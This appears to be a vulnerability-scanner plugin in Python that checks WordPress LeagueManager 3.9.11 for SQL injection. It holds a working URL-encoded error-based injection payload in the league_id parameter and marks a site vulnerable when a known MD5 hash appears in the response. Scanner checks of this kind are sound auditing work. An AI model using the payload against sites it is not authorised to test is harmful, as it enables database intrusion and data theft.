# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= 7d0y
#_PlugName_ = WordPress LeagueManager 3.9.11 Plugin - SQLi
#_FileName_ = LeagueManager.py
#_Refer_ = https://www.exploit-db.com/exploits/37182/


def assign(service, args):
    if service == 'wordpress':
        return True, args

def audit(args):
    payload = "?season=1&league_id=1%27%20AND%20(SELECT%203804%20FROM(SELECT%20COUNT(*),CONCAT(0x7178766b71,md5(12345),0x7170707171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%20AND%20%27zZcz%27=%27zZcz&match_day=1&team_id=1"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "827ccb0eea8a706c4c34a16891f84e7b" in res:
        security_hole(verify_url)

if __name__ == "__main__":
    from dummy import *
    audit(assign('wordpress', 'http://192.168.0.146/')[1])